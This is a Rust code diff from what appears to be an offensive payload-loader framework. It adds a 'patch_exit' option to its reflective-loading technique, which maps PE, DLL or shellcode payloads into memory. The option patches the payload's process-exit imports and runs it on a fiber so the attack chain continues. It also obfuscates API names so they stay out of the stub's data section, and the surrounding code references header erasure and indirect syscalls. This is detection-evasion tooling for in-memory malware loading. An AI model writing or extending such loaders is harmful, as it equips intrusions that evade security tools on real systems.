@@ -16,6 +16,7 @@ use super::{Capability, Category, Stability, TechniqueDef};
 /// Parameters for reflective loading: which payload to load (the payload
 /// format and export live in the payload's `build.payloads` entry).
 #[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
+#[serde(deny_unknown_fields)]
 pub struct Params {
     /// Name of the payload in `build.payloads` to load. Optional when the plan
     /// declares exactly one payload.
@@ -31,6 +32,27 @@ pub struct Params {
     /// `pe`/`dll` payloads; a `shellcode` payload has no mapped image.
     #[serde(default)]
     pub erase_header: bool,
+
+    /// Patch the mapped image's `ExitProcess`/`ExitThread` imports so a payload
+    /// that exits hands control back to the loader instead of ending the
+    /// process, and run the payload on a fiber so that hand-off is possible.
+    ///
+    /// A normal PE executable's `mainCRTStartup` ends with `ExitProcess`, which
+    /// would tear down the stub and every step after this one (the reason a
+    /// reflective `pe` step is otherwise terminal). With this option the step
+    /// *returns*: the payload's exit code becomes the step's result and the
+    /// chain continues.
+    ///
+    /// Only the imports the payload's own image declares are patched:
+    /// `ExitProcess`, `ExitThread`, the C runtime's `exit`/`_exit` and
+    /// `TerminateProcess` when the handle is this process. A call resolved
+    /// dynamically (`GetProcAddress`), `RtlExitUserProcess`, an import by
+    /// ordinal, an exit performed inside another loaded DLL (the Python
+    /// runtime, a runtime's own CRT), or a child process the payload spawns is
+    /// not covered. Applies only to `pe`/`dll` payloads: a `shellcode` payload
+    /// has no import table to patch.
+    #[serde(default)]
+    pub patch_exit: bool,
 }
 
 /// Static metadata for reflective loading.
@@ -52,7 +74,8 @@ pub const DEF: TechniqueDef = TechniqueDef {
         super::PayloadFormat::Shellcode,
     ],
     requires_indirect_syscalls: false,
-    params_example: "technique: reflective_loading\nparams:\n  erase_header: false\n",
+    params_example:
+        "technique: reflective_loading\nparams:\n  erase_header: false\n  patch_exit: false\n",
     readme: include_str!("README.md"),
     // Allocation and page protection go through the syscall layer
     // (`nt_alloc_vm`/`nt_protect_vm`), so `mode: indirect` removes the
@@ -127,6 +150,14 @@ const MESSAGES: &[(&str, &str)] = &[
         "$MSG_EXPORT_FORWARDER$",
         "the export is a forwarder, which this loader does not resolve",
     ),
+    (
+        "$MSG_FIBER_CONVERT_FAILED$",
+        "could not convert the loader thread to a fiber",
+    ),
+    (
+        "$MSG_FIBER_CREATE_FAILED$",
+        "could not create the payload's fiber",
+    ),
 ];
 
 /// Runtime diagnostics the shellcode runner can emit, as `(placeholder,
@@ -171,13 +202,48 @@ fn substitute(
 impl Params {
     /// Renders the reflective-loading stub fragment.
     ///
-    /// The only per-build value is [`Params::erase_header`] (a `true`/`false`
-    /// constant in the fragment); `strings` feeds the obfuscated diagnostics.
+    /// The per-build values are [`Params::erase_header`] and
+    /// [`Params::patch_exit`] (a `true`/`false` constant each) plus the exit
+    /// call names, which are rebuilt at runtime so none lands in the stub's
+    /// `.rdata`; `strings` feeds the obfuscated diagnostics.
     pub fn render_fragment(&self, strings: &StringsConfig) -> String {
-        substitute(DEF.stub_fragment.to_string(), MESSAGES, strings, "pe_msg_").replace(
-            "$ERASE_HEADER$",
-            if self.erase_header { "true" } else { "false" },
-        )
+        substitute(DEF.stub_fragment.to_string(), MESSAGES, strings, "pe_msg_")
+            .replace(
+                "$ERASE_HEADER$",
+                if self.erase_header { "true" } else { "false" },
+            )
+            .replace(
+                "$PATCH_EXIT$",
+                if self.patch_exit { "true" } else { "false" },
+            )
+            .replace(
+                "$EXIT_PROCESS_DEF$",
+                &strings
+                    .obfuscate("ExitProcess")
+                    .render_stub_expr("exit_process_name"),
+            )
+            .replace(
+                "$EXIT_THREAD_DEF$",
+                &strings
+                    .obfuscate("ExitThread")
+                    .render_stub_expr("exit_thread_name"),
+            )
+            .replace(
+                "$EXIT_DEF$",
+                &strings.obfuscate("exit").render_stub_expr("crt_exit_name"),
+            )
+            .replace(
+                "$UNDERSCORE_EXIT_DEF$",
+                &strings
+                    .obfuscate("_exit")
+                    .render_stub_expr("crt_exit_fast_name"),
+            )
+            .replace(
+                "$TERMINATE_PROCESS_DEF$",
+                &strings
+                    .obfuscate("TerminateProcess")
+                    .render_stub_expr("terminate_process_name"),
+            )
     }
 
     /// Renders the fragment that matches the payload's binary format.
@@ -185,7 +251,8 @@ impl Params {
     /// `pe` and `dll` share the PE mapper; a DLL may additionally name an
     /// export to call (`build.payloads.<name>.export`, obfuscated through `strings`). A
     /// `shellcode` payload gets the raw-code runner instead — it has no mapped
-    /// image, so [`Params::erase_header`] does not apply to it.
+    /// image, so [`Params::erase_header`] and [`Params::patch_exit`] do not apply
+    /// to it.
     pub fn render_fragment_for(
         &self,
         strings: &StringsConfig,
